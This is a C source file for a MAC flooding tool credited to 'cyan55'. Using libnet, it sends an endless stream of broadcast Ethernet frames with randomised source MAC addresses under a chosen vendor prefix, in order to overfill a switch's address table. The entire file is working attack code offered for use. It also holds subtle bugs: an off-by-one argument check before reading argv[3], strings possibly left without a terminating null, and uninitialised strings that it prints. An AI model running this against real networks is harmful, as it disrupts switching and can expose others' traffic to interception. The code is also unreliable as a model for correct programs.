#include <stdio.h>
#include <libnet.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "../SEHT-Headers/exp.h"
#include "../SEHT-Headers/exp_libnetpcap.h"

int main(int argc, char* argv[])
{
	time_t tme;
	srand((unsigned int)time(&tme));

	printf("Welcome to MAC flood (+.+) <Program by cyan55>\n\n----------------------------------------------\n\n");

	if(argc < 3)
		exp_error("Usage:\n\n<device> <interval OR -1> <VENDOR 3 OCTET ex. 00:00:00>", EXP_EXIT_ERROR);

	int interval = atoi(argv[2]);

	char octet[9];
	strncpy(octet, argv[3], 9);

	char device[10];
	char errbuff[LIBNET_ERRBUF_SIZE];

	strncpy(device, argv[1], 10);
	libnet_t *lnet = libnet_init(LIBNET_LINK, device, errbuff);

	if(lnet == NULL)
		exp_error(errbuff, EXP_EXIT_ERROR);

	printf("Opened instance with device %s\n", device);

	//Seed prand
	int seed = libnet_seed_prand(lnet);
	int mac_addr_size = 17;

	//Set dest addr
	u_int8_t* dest_addr;
	u_int8_t* src_addr;

	struct exp_mac_addr mac_dst;
	struct exp_mac_addr mac_src;

	char src_ip_c[32];
	char dst_ip_c[32];

	u_int32_t src_ip;
	u_int32_t dst_ip;

	int n = 1;
	unsigned int protocol = 0x0000;

	while(0==0)
	{
		//Get random source MAC ADDR with vendor
		mac_address_with_vendor(octet, &mac_src);

		//Set destination mac address
		mac_address(&mac_dst, "FF:FF:FF:FF:FF:FF");

		libnet_build_ethernet(mac_dst.mac_network, mac_src.mac_network, protocol, NULL, 0, lnet, 0);
		libnet_open_link(lnet);
		if(libnet_write(lnet) == -1)
			exp_error("Could not write packet to the network", EXP_EXIT_NETWORK_WRITE_ERROR);
		libnet_close_link(lnet);

		if(interval != -1)
			sleep(interval);
		printf("[%d][OK] %s--->%s (%s--->%s)\n", n, mac_src.mac_string, mac_dst.mac_string, src_ip_c, dst_ip_c);
		libnet_clear_packet(lnet);
		n++;
	}
	libnet_destroy(lnet);
	return SC_EXIT_SUCCESS;
}
